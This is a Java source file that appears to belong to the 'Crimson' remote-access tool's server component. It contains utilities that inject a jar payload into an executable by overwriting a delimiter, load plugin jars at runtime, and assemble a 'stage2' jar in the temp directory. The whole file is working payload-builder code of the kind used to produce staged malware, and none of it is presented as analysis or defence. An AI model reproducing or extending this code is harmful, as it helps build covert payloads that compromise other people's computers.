package subterranean.crimson.server;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;

import subterranean.crimson.universal.GenerationUtils;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.classreference.Stage2;

public enum ServerUtilities {

	;

	public static void injectPayload(File jar, File target) {
		Logger.add("Injecting Jar into executable...");
		String code = "abcdefghijklmnopqrstuvwxyz";
		byte[] line = Utilities.readFile(jar);
		Logger.add("Jar Length: " + line.length + " bytes");
		line = Utilities.concat(line, code.getBytes());
		try {
			RandomAccessFile raf = new RandomAccessFile(target, "rw");

			// find the delimeters and replace with the options
			for (long l = 0; l < raf.length(); l++) {
				raf.seek(l);
				boolean equal = true;
				for (int c = 0; c < code.length(); c++) {
					char read = (char) raf.readByte();
					char ch = code.charAt(c);
					if (read != ch) {
						equal = false;
						break;
					}
				}
				if (equal) {
					Logger.add("Found Jar in exe!");
					// found the match
					raf.seek(l);

					raf.write(line);

					break;

				} else {
					// keep looking
					continue;
				}

			}
			raf.close();

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Logger.add("Injected payload into executable");

	}

	public static void loadJar(File file) {
		if (!file.exists()) {
			// doesnt exist
			Logger.add("Jar doesnt exist at: " + file.getAbsolutePath());
			return;
		}

		try {
			ClassLoader cl = new URLClassLoader(new URL[] { file.toURI().toURL() });
			Class cls = cl.loadClass("subterranean.crimson.server.plugins." + file.getName().split("\\.")[0] + ".SP");
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public static byte[] loadStage2() {
		File stage2 = new File(Platform.tempDir + "crimson_stage2.jar");
		if (!stage2.exists()) {
			File root = Utilities.getTemp();
			GenerationUtils.writeClasses(Stage2.resources, root, new ArrayList<String>());
			String[] targets = { "io", "subterranean", "org" };
			try {
				GenerationUtils.create(stage2.getAbsolutePath(), targets, "", root);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}

		return Utilities.readFile(stage2);
	}

}
